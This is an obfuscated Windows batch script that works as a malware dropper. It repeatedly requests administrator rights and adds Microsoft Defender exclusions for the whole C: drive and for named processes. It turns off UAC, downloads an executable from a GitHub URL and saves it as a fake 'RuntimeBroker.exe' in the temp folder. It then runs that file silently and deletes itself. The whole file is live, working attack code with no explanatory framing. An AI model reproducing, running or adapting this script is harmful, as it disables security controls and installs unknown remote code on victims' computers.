@echo off & setlocal enableDelayedExpansion
set "xTq=2>&1" & set "Hrdc=>nul" & set "bXfI=SESSION" & set "fQE=NET"
%fQE% %bXfI% %Hrdc% %xTq%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "HfkX=qux" & set "Atl=foo" & set "RLhxh=baz" & set "NpP=bar" & rem FnInTUw kTwsck eFoUjQ
set "wki=powershell -ExecutionPolicy Bypass -Command"
set "ywXG=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath 'C:\' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue"
!wki! "!ywXG!" %Hrdc% %xTq%
set "jeU=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0"
!wki! "!jeU!" %Hrdc% %xTq%
set "oom=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 }"
!wki! "!oom!" %Hrdc% %xTq%
if !errorlevel! neq 0 (goto %a%)
set "hDiZ=timeout /t" & !hDiZ! 2 %Hrdc% %xTq%
set "eVuhi=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!wki! "!eVuhi!" %Hrdc% %xTq%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!hDiZ! 1 %Hrdc% %xTq% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %Hrdc% %xTq%
del /f /q "%~f0" %Hrdc% %xTq%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %Hrdc% %xTq%
if !errorlevel! neq 0 (!hDiZ! 3 %Hrdc% %xTq% & goto %b%)
exit /b
